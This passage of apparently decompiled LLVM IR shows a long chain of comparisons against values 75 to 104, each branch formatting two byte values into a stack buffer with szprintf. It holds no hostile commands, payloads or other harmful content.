  %v0_804aa9e = load i8, i8* @global_var_805b539.40, align 1
  %v1_804aa9e = zext i8 %v0_804aa9e to i32
  %v2_804aaad = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804aaad, i32* @ebx, align 4
  %v5_804aab4 = call i32 @szprintf(i32 %v2_804aaad, i32 ptrtoint ([13 x i8]* @global_var_80582d6.114 to i32), i32 %v1_804aa9e, i32 %v1_804aa92)
  br label %dec_label_pc_804aabc

dec_label_pc_804aabc:                             ; preds = %dec_label_pc_804aa8c, %dec_label_pc_804aa92
  %v12_804aabc = icmp eq i32 %v11_8049ca7, 75
  %v1_804aac0 = icmp eq i1 %v12_804aabc, false
  br i1 %v1_804aac0, label %dec_label_pc_804aaec, label %dec_label_pc_804aac2

dec_label_pc_804aac2:                             ; preds = %dec_label_pc_804aabc
  %v0_804aac2 = load i8, i8* @global_var_805b53a.41, align 2
  %v1_804aac2 = zext i8 %v0_804aac2 to i32
  store i32 %v1_804aac2, i32* @edx, align 4
  %v0_804aace = load i8, i8* @global_var_805b539.40, align 1
  %v1_804aace = zext i8 %v0_804aace to i32
  %v2_804aadd = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804aadd, i32* @ebx, align 4
  %v5_804aae4 = call i32 @szprintf(i32 %v2_804aadd, i32 ptrtoint ([13 x i8]* @global_var_80582e3.115 to i32), i32 %v1_804aace, i32 %v1_804aac2)
  br label %dec_label_pc_804aaec

dec_label_pc_804aaec:                             ; preds = %dec_label_pc_804aabc, %dec_label_pc_804aac2
  %v12_804aaec = icmp eq i32 %v11_8049ca7, 76
  %v1_804aaf0 = icmp eq i1 %v12_804aaec, false
  br i1 %v1_804aaf0, label %dec_label_pc_804ab1c, label %dec_label_pc_804aaf2

dec_label_pc_804aaf2:                             ; preds = %dec_label_pc_804aaec
  %v0_804aaf2 = load i8, i8* @global_var_805b53a.41, align 2
  %v1_804aaf2 = zext i8 %v0_804aaf2 to i32
  store i32 %v1_804aaf2, i32* @edx, align 4
  %v0_804aafe = load i8, i8* @global_var_805b539.40, align 1
  %v1_804aafe = zext i8 %v0_804aafe to i32
  %v2_804ab0d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804ab0d, i32* @ebx, align 4
  %v5_804ab14 = call i32 @szprintf(i32 %v2_804ab0d, i32 ptrtoint ([13 x i8]* @global_var_80582f0.116 to i32), i32 %v1_804aafe, i32 %v1_804aaf2)
  br label %dec_label_pc_804ab1c

dec_label_pc_804ab1c:                             ; preds = %dec_label_pc_804aaec, %dec_label_pc_804aaf2
  %v12_804ab1c = icmp eq i32 %v11_8049ca7, 77
  %v1_804ab20 = icmp eq i1 %v12_804ab1c, false
  br i1 %v1_804ab20, label %dec_label_pc_804ab4c, label %dec_label_pc_804ab22

dec_label_pc_804ab22:                             ; preds = %dec_label_pc_804ab1c
  %v0_804ab22 = load i8, i8* @global_var_805b53a.41, align 2
  %v1_804ab22 = zext i8 %v0_804ab22 to i32
  store i32 %v1_804ab22, i32* @edx, align 4
  %v0_804ab2e = load i8, i8* @global_var_805b539.40, align 1
  %v1_804ab2e = zext i8 %v0_804ab2e to i32
  %v2_804ab3d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804ab3d, i32* @ebx, align 4
  %v5_804ab44 = call i32 @szprintf(i32 %v2_804ab3d, i32 ptrtoint ([13 x i8]* @global_var_80582fd.117 to i32), i32 %v1_804ab2e, i32 %v1_804ab22)
  br label %dec_label_pc_804ab4c

dec_label_pc_804ab4c:                             ; preds = %dec_label_pc_804ab1c, %dec_label_pc_804ab22
  %v12_804ab4c = icmp eq i32 %v11_8049ca7, 78
  %v1_804ab50 = icmp eq i1 %v12_804ab4c, false
  br i1 %v1_804ab50, label %dec_label_pc_804ab7c, label %dec_label_pc_804ab52

dec_label_pc_804ab52:                             ; preds = %dec_label_pc_804ab4c
  %v0_804ab52 = load i8, i8* @global_var_805b53a.41, align 2
  %v1_804ab52 = zext i8 %v0_804ab52 to i32
  store i32 %v1_804ab52, i32* @edx, align 4
  %v0_804ab5e = load i8, i8* @global_var_805b539.40, align 1
  %v1_804ab5e = zext i8 %v0_804ab5e to i32
  %v2_804ab6d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804ab6d, i32* @ebx, align 4
  %v5_804ab74 = call i32 @szprintf(i32 %v2_804ab6d, i32 ptrtoint ([13 x i8]* @global_var_805830a.118 to i32), i32 %v1_804ab5e, i32 %v1_804ab52)
  br label %dec_label_pc_804ab7c

dec_label_pc_804ab7c:                             ; preds = %dec_label_pc_804ab4c, %dec_label_pc_804ab52
  %v12_804ab7c = icmp eq i32 %v11_8049ca7, 79
  %v1_804ab80 = icmp eq i1 %v12_804ab7c, false
  br i1 %v1_804ab80, label %dec_label_pc_804abac, label %dec_label_pc_804ab82

dec_label_pc_804ab82:                             ; preds = %dec_label_pc_804ab7c
  %v0_804ab82 = load i8, i8* @global_var_805b53a.41, align 2
  %v1_804ab82 = zext i8 %v0_804ab82 to i32
  store i32 %v1_804ab82, i32* @edx, align 4
  %v0_804ab8e = load i8, i8* @global_var_805b539.40, align 1
  %v1_804ab8e = zext i8 %v0_804ab8e to i32
  %v2_804ab9d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804ab9d, i32* @ebx, align 4
  %v5_804aba4 = call i32 @szprintf(i32 %v2_804ab9d, i32 ptrtoint ([13 x i8]* @global_var_8058317.119 to i32), i32 %v1_804ab8e, i32 %v1_804ab82)
  br label %dec_label_pc_804abac

dec_label_pc_804abac:                             ; preds = %dec_label_pc_804ab7c, %dec_label_pc_804ab82
  %v9_804abac = icmp eq i32 %v11_8049ca7, 80
  %v1_804abb0 = icmp eq i1 %v9_804abac, false
  br i1 %v1_804abb0, label %dec_label_pc_804abdc, label %dec_label_pc_804abb2

dec_label_pc_804abb2:                             ; preds = %dec_label_pc_804abac
  %v0_804abb2 = load i8, i8* @global_var_805b53a.41, align 2
  %v1_804abb2 = zext i8 %v0_804abb2 to i32
  store i32 %v1_804abb2, i32* @edx, align 4
  %v0_804abbe = load i8, i8* @global_var_805b539.40, align 1
  %v1_804abbe = zext i8 %v0_804abbe to i32
  %v2_804abcd = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804abcd, i32* @ebx, align 4
  %v5_804abd4 = call i32 @szprintf(i32 %v2_804abcd, i32 ptrtoint ([13 x i8]* @global_var_8058324.120 to i32), i32 %v1_804abbe, i32 %v1_804abb2)
  br label %dec_label_pc_804abdc

dec_label_pc_804abdc:                             ; preds = %dec_label_pc_804abac, %dec_label_pc_804abb2
  %v12_804abdc = icmp eq i32 %v11_8049ca7, 81
  %v1_804abe0 = icmp eq i1 %v12_804abdc, false
  br i1 %v1_804abe0, label %dec_label_pc_804ac0c, label %dec_label_pc_804abe2

dec_label_pc_804abe2:                             ; preds = %dec_label_pc_804abdc
  %v0_804abe2 = load i8, i8* @global_var_805b53a.41, align 2
  %v1_804abe2 = zext i8 %v0_804abe2 to i32
  store i32 %v1_804abe2, i32* @edx, align 4
  %v0_804abee = load i8, i8* @global_var_805b539.40, align 1
  %v1_804abee = zext i8 %v0_804abee to i32
  %v2_804abfd = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804abfd, i32* @ebx, align 4
  %v5_804ac04 = call i32 @szprintf(i32 %v2_804abfd, i32 ptrtoint ([13 x i8]* @global_var_8058331.121 to i32), i32 %v1_804abee, i32 %v1_804abe2)
  br label %dec_label_pc_804ac0c

dec_label_pc_804ac0c:                             ; preds = %dec_label_pc_804abdc, %dec_label_pc_804abe2
  %v12_804ac0c = icmp eq i32 %v11_8049ca7, 82
  %v1_804ac10 = icmp eq i1 %v12_804ac0c, false
  br i1 %v1_804ac10, label %dec_label_pc_804ac3c, label %dec_label_pc_804ac12

dec_label_pc_804ac12:                             ; preds = %dec_label_pc_804ac0c
  %v0_804ac12 = load i8, i8* @global_var_805b53a.41, align 2
  %v1_804ac12 = zext i8 %v0_804ac12 to i32
  store i32 %v1_804ac12, i32* @edx, align 4
  %v0_804ac1e = load i8, i8* @global_var_805b539.40, align 1
  %v1_804ac1e = zext i8 %v0_804ac1e to i32
  %v2_804ac2d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804ac2d, i32* @ebx, align 4
  %v5_804ac34 = call i32 @szprintf(i32 %v2_804ac2d, i32 ptrtoint ([13 x i8]* @global_var_805833e.122 to i32), i32 %v1_804ac1e, i32 %v1_804ac12)
  br label %dec_label_pc_804ac3c

dec_label_pc_804ac3c:                             ; preds = %dec_label_pc_804ac0c, %dec_label_pc_804ac12
  %v12_804ac3c = icmp eq i32 %v11_8049ca7, 83
  %v1_804ac40 = icmp eq i1 %v12_804ac3c, false
  br i1 %v1_804ac40, label %dec_label_pc_804ac6c, label %dec_label_pc_804ac42

dec_label_pc_804ac42:                             ; preds = %dec_label_pc_804ac3c
  %v0_804ac42 = load i8, i8* @global_var_805b53a.41, align 2
  %v1_804ac42 = zext i8 %v0_804ac42 to i32
  store i32 %v1_804ac42, i32* @edx, align 4
  %v0_804ac4e = load i8, i8* @global_var_805b539.40, align 1
  %v1_804ac4e = zext i8 %v0_804ac4e to i32
  %v2_804ac5d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804ac5d, i32* @ebx, align 4
  %v5_804ac64 = call i32 @szprintf(i32 %v2_804ac5d, i32 ptrtoint ([13 x i8]* @global_var_805834b.123 to i32), i32 %v1_804ac4e, i32 %v1_804ac42)
  br label %dec_label_pc_804ac6c

dec_label_pc_804ac6c:                             ; preds = %dec_label_pc_804ac3c, %dec_label_pc_804ac42
  %v12_804ac6c = icmp eq i32 %v11_8049ca7, 84
  %v1_804ac70 = icmp eq i1 %v12_804ac6c, false
  br i1 %v1_804ac70, label %dec_label_pc_804ac9c, label %dec_label_pc_804ac72

dec_label_pc_804ac72:                             ; preds = %dec_label_pc_804ac6c
  %v0_804ac72 = load i8, i8* @global_var_805b53a.41, align 2
  %v1_804ac72 = zext i8 %v0_804ac72 to i32
  store i32 %v1_804ac72, i32* @edx, align 4
  %v0_804ac7e = load i8, i8* @global_var_805b539.40, align 1
  %v1_804ac7e = zext i8 %v0_804ac7e to i32
  %v2_804ac8d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804ac8d, i32* @ebx, align 4
  %v5_804ac94 = call i32 @szprintf(i32 %v2_804ac8d, i32 ptrtoint ([13 x i8]* @global_var_8058358.124 to i32), i32 %v1_804ac7e, i32 %v1_804ac72)
  br label %dec_label_pc_804ac9c

dec_label_pc_804ac9c:                             ; preds = %dec_label_pc_804ac6c, %dec_label_pc_804ac72
  %v12_804ac9c = icmp eq i32 %v11_8049ca7, 85
  %v1_804aca0 = icmp eq i1 %v12_804ac9c, false
  br i1 %v1_804aca0, label %dec_label_pc_804accc, label %dec_label_pc_804aca2

dec_label_pc_804aca2:                             ; preds = %dec_label_pc_804ac9c
  %v0_804aca2 = load i8, i8* @global_var_805b53a.41, align 2
  %v1_804aca2 = zext i8 %v0_804aca2 to i32
  store i32 %v1_804aca2, i32* @edx, align 4
  %v0_804acae = load i8, i8* @global_var_805b539.40, align 1
  %v1_804acae = zext i8 %v0_804acae to i32
  %v2_804acbd = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804acbd, i32* @ebx, align 4
  %v5_804acc4 = call i32 @szprintf(i32 %v2_804acbd, i32 ptrtoint ([13 x i8]* @global_var_8058365.125 to i32), i32 %v1_804acae, i32 %v1_804aca2)
  br label %dec_label_pc_804accc

dec_label_pc_804accc:                             ; preds = %dec_label_pc_804ac9c, %dec_label_pc_804aca2
  %v12_804accc = icmp eq i32 %v11_8049ca7, 86
  %v1_804acd0 = icmp eq i1 %v12_804accc, false
  br i1 %v1_804acd0, label %dec_label_pc_804acfc, label %dec_label_pc_804acd2

dec_label_pc_804acd2:                             ; preds = %dec_label_pc_804accc
  %v0_804acd2 = load i8, i8* @global_var_805b53a.41, align 2
  %v1_804acd2 = zext i8 %v0_804acd2 to i32
  store i32 %v1_804acd2, i32* @edx, align 4
  %v0_804acde = load i8, i8* @global_var_805b539.40, align 1
  %v1_804acde = zext i8 %v0_804acde to i32
  %v2_804aced = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804aced, i32* @ebx, align 4
  %v5_804acf4 = call i32 @szprintf(i32 %v2_804aced, i32 ptrtoint ([13 x i8]* @global_var_8058372.126 to i32), i32 %v1_804acde, i32 %v1_804acd2)
  br label %dec_label_pc_804acfc

dec_label_pc_804acfc:                             ; preds = %dec_label_pc_804accc, %dec_label_pc_804acd2
  %v12_804acfc = icmp eq i32 %v11_8049ca7, 87
  %v1_804ad00 = icmp eq i1 %v12_804acfc, false
  br i1 %v1_804ad00, label %dec_label_pc_804ad2c, label %dec_label_pc_804ad02

dec_label_pc_804ad02:                             ; preds = %dec_label_pc_804acfc
  %v0_804ad02 = load i8, i8* @global_var_805b53a.41, align 2
  %v1_804ad02 = zext i8 %v0_804ad02 to i32
  store i32 %v1_804ad02, i32* @edx, align 4
  %v0_804ad0e = load i8, i8* @global_var_805b539.40, align 1
  %v1_804ad0e = zext i8 %v0_804ad0e to i32
  %v2_804ad1d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804ad1d, i32* @ebx, align 4
  %v5_804ad24 = call i32 @szprintf(i32 %v2_804ad1d, i32 ptrtoint ([13 x i8]* @global_var_805837f.127 to i32), i32 %v1_804ad0e, i32 %v1_804ad02)
  br label %dec_label_pc_804ad2c

dec_label_pc_804ad2c:                             ; preds = %dec_label_pc_804acfc, %dec_label_pc_804ad02
  %v12_804ad2c = icmp eq i32 %v11_8049ca7, 88
  %v1_804ad30 = icmp eq i1 %v12_804ad2c, false
  br i1 %v1_804ad30, label %dec_label_pc_804ad5c, label %dec_label_pc_804ad32

dec_label_pc_804ad32:                             ; preds = %dec_label_pc_804ad2c
  %v0_804ad32 = load i8, i8* @global_var_805b53a.41, align 2
  %v1_804ad32 = zext i8 %v0_804ad32 to i32
  store i32 %v1_804ad32, i32* @edx, align 4
  %v0_804ad3e = load i8, i8* @global_var_805b539.40, align 1
  %v1_804ad3e = zext i8 %v0_804ad3e to i32
  %v2_804ad4d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804ad4d, i32* @ebx, align 4
  %v5_804ad54 = call i32 @szprintf(i32 %v2_804ad4d, i32 ptrtoint ([13 x i8]* @global_var_805838c.128 to i32), i32 %v1_804ad3e, i32 %v1_804ad32)
  br label %dec_label_pc_804ad5c

dec_label_pc_804ad5c:                             ; preds = %dec_label_pc_804ad2c, %dec_label_pc_804ad32
  %v12_804ad5c = icmp eq i32 %v11_8049ca7, 89
  %v1_804ad60 = icmp eq i1 %v12_804ad5c, false
  br i1 %v1_804ad60, label %dec_label_pc_804ad8c, label %dec_label_pc_804ad62

dec_label_pc_804ad62:                             ; preds = %dec_label_pc_804ad5c
  %v0_804ad62 = load i8, i8* @global_var_805b53a.41, align 2
  %v1_804ad62 = zext i8 %v0_804ad62 to i32
  store i32 %v1_804ad62, i32* @edx, align 4
  %v0_804ad6e = load i8, i8* @global_var_805b539.40, align 1
  %v1_804ad6e = zext i8 %v0_804ad6e to i32
  %v2_804ad7d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804ad7d, i32* @ebx, align 4
  %v5_804ad84 = call i32 @szprintf(i32 %v2_804ad7d, i32 ptrtoint ([13 x i8]* @global_var_8058399.129 to i32), i32 %v1_804ad6e, i32 %v1_804ad62)
  br label %dec_label_pc_804ad8c

dec_label_pc_804ad8c:                             ; preds = %dec_label_pc_804ad5c, %dec_label_pc_804ad62
  %v12_804ad8c = icmp eq i32 %v11_8049ca7, 90
  %v1_804ad90 = icmp eq i1 %v12_804ad8c, false
  br i1 %v1_804ad90, label %dec_label_pc_804adbc, label %dec_label_pc_804ad92

dec_label_pc_804ad92:                             ; preds = %dec_label_pc_804ad8c
  %v0_804ad92 = load i8, i8* @global_var_805b53a.41, align 2
  %v1_804ad92 = zext i8 %v0_804ad92 to i32
  store i32 %v1_804ad92, i32* @edx, align 4
  %v0_804ad9e = load i8, i8* @global_var_805b539.40, align 1
  %v1_804ad9e = zext i8 %v0_804ad9e to i32
  %v2_804adad = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804adad, i32* @ebx, align 4
  %v5_804adb4 = call i32 @szprintf(i32 %v2_804adad, i32 ptrtoint ([13 x i8]* @global_var_80583a6.130 to i32), i32 %v1_804ad9e, i32 %v1_804ad92)
  br label %dec_label_pc_804adbc

dec_label_pc_804adbc:                             ; preds = %dec_label_pc_804ad8c, %dec_label_pc_804ad92
  %v12_804adbc = icmp eq i32 %v11_8049ca7, 91
  %v1_804adc0 = icmp eq i1 %v12_804adbc, false
  br i1 %v1_804adc0, label %dec_label_pc_804adec, label %dec_label_pc_804adc2

dec_label_pc_804adc2:                             ; preds = %dec_label_pc_804adbc
  %v0_804adc2 = load i8, i8* @global_var_805b53a.41, align 2
  %v1_804adc2 = zext i8 %v0_804adc2 to i32
  store i32 %v1_804adc2, i32* @edx, align 4
  %v0_804adce = load i8, i8* @global_var_805b539.40, align 1
  %v1_804adce = zext i8 %v0_804adce to i32
  %v2_804addd = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804addd, i32* @ebx, align 4
  %v5_804ade4 = call i32 @szprintf(i32 %v2_804addd, i32 ptrtoint ([13 x i8]* @global_var_80583b3.131 to i32), i32 %v1_804adce, i32 %v1_804adc2)
  br label %dec_label_pc_804adec

dec_label_pc_804adec:                             ; preds = %dec_label_pc_804adbc, %dec_label_pc_804adc2
  %v12_804adec = icmp eq i32 %v11_8049ca7, 92
  %v1_804adf0 = icmp eq i1 %v12_804adec, false
  br i1 %v1_804adf0, label %dec_label_pc_804ae1c, label %dec_label_pc_804adf2

dec_label_pc_804adf2:                             ; preds = %dec_label_pc_804adec
  %v0_804adf2 = load i8, i8* @global_var_805b53a.41, align 2
  %v1_804adf2 = zext i8 %v0_804adf2 to i32
  store i32 %v1_804adf2, i32* @edx, align 4
  %v0_804adfe = load i8, i8* @global_var_805b539.40, align 1
  %v1_804adfe = zext i8 %v0_804adfe to i32
  %v2_804ae0d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804ae0d, i32* @ebx, align 4
  %v5_804ae14 = call i32 @szprintf(i32 %v2_804ae0d, i32 ptrtoint ([13 x i8]* @global_var_80583c0.132 to i32), i32 %v1_804adfe, i32 %v1_804adf2)
  br label %dec_label_pc_804ae1c

dec_label_pc_804ae1c:                             ; preds = %dec_label_pc_804adec, %dec_label_pc_804adf2
  %v12_804ae1c = icmp eq i32 %v11_8049ca7, 93
  %v1_804ae20 = icmp eq i1 %v12_804ae1c, false
  br i1 %v1_804ae20, label %dec_label_pc_804ae4c, label %dec_label_pc_804ae22

dec_label_pc_804ae22:                             ; preds = %dec_label_pc_804ae1c
  %v0_804ae22 = load i8, i8* @global_var_805b53a.41, align 2
  %v1_804ae22 = zext i8 %v0_804ae22 to i32
  store i32 %v1_804ae22, i32* @edx, align 4
  %v0_804ae2e = load i8, i8* @global_var_805b539.40, align 1
  %v1_804ae2e = zext i8 %v0_804ae2e to i32
  %v2_804ae3d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804ae3d, i32* @ebx, align 4
  %v5_804ae44 = call i32 @szprintf(i32 %v2_804ae3d, i32 ptrtoint ([13 x i8]* @global_var_80583cd.133 to i32), i32 %v1_804ae2e, i32 %v1_804ae22)
  br label %dec_label_pc_804ae4c

dec_label_pc_804ae4c:                             ; preds = %dec_label_pc_804ae1c, %dec_label_pc_804ae22
  %v12_804ae4c = icmp eq i32 %v11_8049ca7, 94
  %v1_804ae50 = icmp eq i1 %v12_804ae4c, false
  br i1 %v1_804ae50, label %dec_label_pc_804ae7c, label %dec_label_pc_804ae52

dec_label_pc_804ae52:                             ; preds = %dec_label_pc_804ae4c
  %v0_804ae52 = load i8, i8* @global_var_805b53a.41, align 2
  %v1_804ae52 = zext i8 %v0_804ae52 to i32
  store i32 %v1_804ae52, i32* @edx, align 4
  %v0_804ae5e = load i8, i8* @global_var_805b539.40, align 1
  %v1_804ae5e = zext i8 %v0_804ae5e to i32
  %v2_804ae6d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804ae6d, i32* @ebx, align 4
  %v5_804ae74 = call i32 @szprintf(i32 %v2_804ae6d, i32 ptrtoint ([13 x i8]* @global_var_805813f.83 to i32), i32 %v1_804ae5e, i32 %v1_804ae52)
  br label %dec_label_pc_804ae7c

dec_label_pc_804ae7c:                             ; preds = %dec_label_pc_804ae4c, %dec_label_pc_804ae52
  %v12_804ae7c = icmp eq i32 %v11_8049ca7, 95
  %v1_804ae80 = icmp eq i1 %v12_804ae7c, false
  br i1 %v1_804ae80, label %dec_label_pc_804aeac, label %dec_label_pc_804ae82

dec_label_pc_804ae82:                             ; preds = %dec_label_pc_804ae7c
  %v0_804ae82 = load i8, i8* @global_var_805b53a.41, align 2
  %v1_804ae82 = zext i8 %v0_804ae82 to i32
  store i32 %v1_804ae82, i32* @edx, align 4
  %v0_804ae8e = load i8, i8* @global_var_805b539.40, align 1
  %v1_804ae8e = zext i8 %v0_804ae8e to i32
  %v2_804ae9d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804ae9d, i32* @ebx, align 4
  %v5_804aea4 = call i32 @szprintf(i32 %v2_804ae9d, i32 ptrtoint ([13 x i8]* @global_var_80583da.134 to i32), i32 %v1_804ae8e, i32 %v1_804ae82)
  br label %dec_label_pc_804aeac

dec_label_pc_804aeac:                             ; preds = %dec_label_pc_804ae7c, %dec_label_pc_804ae82
  %v9_804aeac = icmp eq i32 %v11_8049ca7, 96
  %v1_804aeb0 = icmp eq i1 %v9_804aeac, false
  br i1 %v1_804aeb0, label %dec_label_pc_804aedc, label %dec_label_pc_804aeb2

dec_label_pc_804aeb2:                             ; preds = %dec_label_pc_804aeac
  %v0_804aeb2 = load i8, i8* @global_var_805b53a.41, align 2
  %v1_804aeb2 = zext i8 %v0_804aeb2 to i32
  store i32 %v1_804aeb2, i32* @edx, align 4
  %v0_804aebe = load i8, i8* @global_var_805b539.40, align 1
  %v1_804aebe = zext i8 %v0_804aebe to i32
  %v2_804aecd = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804aecd, i32* @ebx, align 4
  %v5_804aed4 = call i32 @szprintf(i32 %v2_804aecd, i32 ptrtoint ([13 x i8]* @global_var_8058166.86 to i32), i32 %v1_804aebe, i32 %v1_804aeb2)
  br label %dec_label_pc_804aedc

dec_label_pc_804aedc:                             ; preds = %dec_label_pc_804aeac, %dec_label_pc_804aeb2
  %v12_804aedc = icmp eq i32 %v11_8049ca7, 97
  %v1_804aee0 = icmp eq i1 %v12_804aedc, false
  br i1 %v1_804aee0, label %dec_label_pc_804af0c, label %dec_label_pc_804aee2

dec_label_pc_804aee2:                             ; preds = %dec_label_pc_804aedc
  %v0_804aee2 = load i8, i8* @global_var_805b53a.41, align 2
  %v1_804aee2 = zext i8 %v0_804aee2 to i32
  store i32 %v1_804aee2, i32* @edx, align 4
  %v0_804aeee = load i8, i8* @global_var_805b539.40, align 1
  %v1_804aeee = zext i8 %v0_804aeee to i32
  %v2_804aefd = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804aefd, i32* @ebx, align 4
  %v5_804af04 = call i32 @szprintf(i32 %v2_804aefd, i32 ptrtoint ([13 x i8]* @global_var_80583e7.135 to i32), i32 %v1_804aeee, i32 %v1_804aee2)
  br label %dec_label_pc_804af0c

dec_label_pc_804af0c:                             ; preds = %dec_label_pc_804aedc, %dec_label_pc_804aee2
  %v12_804af0c = icmp eq i32 %v11_8049ca7, 98
  %v1_804af10 = icmp eq i1 %v12_804af0c, false
  br i1 %v1_804af10, label %dec_label_pc_804af3c, label %dec_label_pc_804af12

dec_label_pc_804af12:                             ; preds = %dec_label_pc_804af0c
  %v0_804af12 = load i8, i8* @global_var_805b53a.41, align 2
  %v1_804af12 = zext i8 %v0_804af12 to i32
  store i32 %v1_804af12, i32* @edx, align 4
  %v0_804af1e = load i8, i8* @global_var_805b539.40, align 1
  %v1_804af1e = zext i8 %v0_804af1e to i32
  %v2_804af2d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804af2d, i32* @ebx, align 4
  %v5_804af34 = call i32 @szprintf(i32 %v2_804af2d, i32 ptrtoint ([13 x i8]* @global_var_80583f4.136 to i32), i32 %v1_804af1e, i32 %v1_804af12)
  br label %dec_label_pc_804af3c

dec_label_pc_804af3c:                             ; preds = %dec_label_pc_804af0c, %dec_label_pc_804af12
  %v12_804af3c = icmp eq i32 %v11_8049ca7, 99
  %v1_804af40 = icmp eq i1 %v12_804af3c, false
  br i1 %v1_804af40, label %dec_label_pc_804af6c, label %dec_label_pc_804af42

dec_label_pc_804af42:                             ; preds = %dec_label_pc_804af3c
  %v0_804af42 = load i8, i8* @global_var_805b53a.41, align 2
  %v1_804af42 = zext i8 %v0_804af42 to i32
  store i32 %v1_804af42, i32* @edx, align 4
  %v0_804af4e = load i8, i8* @global_var_805b539.40, align 1
  %v1_804af4e = zext i8 %v0_804af4e to i32
  %v2_804af5d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804af5d, i32* @ebx, align 4
  %v5_804af64 = call i32 @szprintf(i32 %v2_804af5d, i32 ptrtoint ([13 x i8]* @global_var_8058401.137 to i32), i32 %v1_804af4e, i32 %v1_804af42)
  br label %dec_label_pc_804af6c

dec_label_pc_804af6c:                             ; preds = %dec_label_pc_804af3c, %dec_label_pc_804af42
  %v12_804af6c = icmp eq i32 %v11_8049ca7, 100
  %v1_804af70 = icmp eq i1 %v12_804af6c, false
  br i1 %v1_804af70, label %dec_label_pc_804af9c, label %dec_label_pc_804af72

dec_label_pc_804af72:                             ; preds = %dec_label_pc_804af6c
  %v0_804af72 = load i8, i8* @global_var_805b53a.41, align 2
  %v1_804af72 = zext i8 %v0_804af72 to i32
  store i32 %v1_804af72, i32* @edx, align 4
  %v0_804af7e = load i8, i8* @global_var_805b539.40, align 1
  %v1_804af7e = zext i8 %v0_804af7e to i32
  %v2_804af8d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804af8d, i32* @ebx, align 4
  %v5_804af94 = call i32 @szprintf(i32 %v2_804af8d, i32 ptrtoint ([13 x i8]* @global_var_805840e.138 to i32), i32 %v1_804af7e, i32 %v1_804af72)
  br label %dec_label_pc_804af9c

dec_label_pc_804af9c:                             ; preds = %dec_label_pc_804af6c, %dec_label_pc_804af72
  %v12_804af9c = icmp eq i32 %v11_8049ca7, 101
  %v1_804afa0 = icmp eq i1 %v12_804af9c, false
  br i1 %v1_804afa0, label %dec_label_pc_804afcc, label %dec_label_pc_804afa2

dec_label_pc_804afa2:                             ; preds = %dec_label_pc_804af9c
  %v0_804afa2 = load i8, i8* @global_var_805b53a.41, align 2
  %v1_804afa2 = zext i8 %v0_804afa2 to i32
  store i32 %v1_804afa2, i32* @edx, align 4
  %v0_804afae = load i8, i8* @global_var_805b539.40, align 1
  %v1_804afae = zext i8 %v0_804afae to i32
  %v2_804afbd = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804afbd, i32* @ebx, align 4
  %v5_804afc4 = call i32 @szprintf(i32 %v2_804afbd, i32 ptrtoint ([13 x i8]* @global_var_805841b.139 to i32), i32 %v1_804afae, i32 %v1_804afa2)
  br label %dec_label_pc_804afcc

dec_label_pc_804afcc:                             ; preds = %dec_label_pc_804af9c, %dec_label_pc_804afa2
  %v12_804afcc = icmp eq i32 %v11_8049ca7, 102
  %v1_804afd0 = icmp eq i1 %v12_804afcc, false
  br i1 %v1_804afd0, label %dec_label_pc_804affc, label %dec_label_pc_804afd2

dec_label_pc_804afd2:                             ; preds = %dec_label_pc_804afcc
  %v0_804afd2 = load i8, i8* @global_var_805b53a.41, align 2
  %v1_804afd2 = zext i8 %v0_804afd2 to i32
  store i32 %v1_804afd2, i32* @edx, align 4
  %v0_804afde = load i8, i8* @global_var_805b539.40, align 1
  %v1_804afde = zext i8 %v0_804afde to i32
  %v2_804afed = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804afed, i32* @ebx, align 4
  %v5_804aff4 = call i32 @szprintf(i32 %v2_804afed, i32 ptrtoint ([12 x i8]* @global_var_8058428.140 to i32), i32 %v1_804afde, i32 %v1_804afd2)
  br label %dec_label_pc_804affc

dec_label_pc_804affc:                             ; preds = %dec_label_pc_804afcc, %dec_label_pc_804afd2
  %v12_804affc = icmp eq i32 %v11_8049ca7, 103
  %v1_804b000 = icmp eq i1 %v12_804affc, false
  br i1 %v1_804b000, label %dec_label_pc_804b02c, label %dec_label_pc_804b002

dec_label_pc_804b002:                             ; preds = %dec_label_pc_804affc
  %v0_804b002 = load i8, i8* @global_var_805b53a.41, align 2
  %v1_804b002 = zext i8 %v0_804b002 to i32
  store i32 %v1_804b002, i32* @edx, align 4
  %v0_804b00e = load i8, i8* @global_var_805b539.40, align 1
  %v1_804b00e = zext i8 %v0_804b00e to i32
  %v2_804b01d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b01d, i32* @ebx, align 4
  %v5_804b024 = call i32 @szprintf(i32 %v2_804b01d, i32 ptrtoint ([13 x i8]* @global_var_8058434.141 to i32), i32 %v1_804b00e, i32 %v1_804b002)
  br label %dec_label_pc_804b02c

dec_label_pc_804b02c:                             ; preds = %dec_label_pc_804affc, %dec_label_pc_804b002
  %v12_804b02c = icmp eq i32 %v11_8049ca7, 104
  %v1_804b030 = icmp eq i1 %v12_804b02c, false
  br i1 %v1_804b030, label %dec_label_pc_804b05c, label %dec_label_pc_804b032

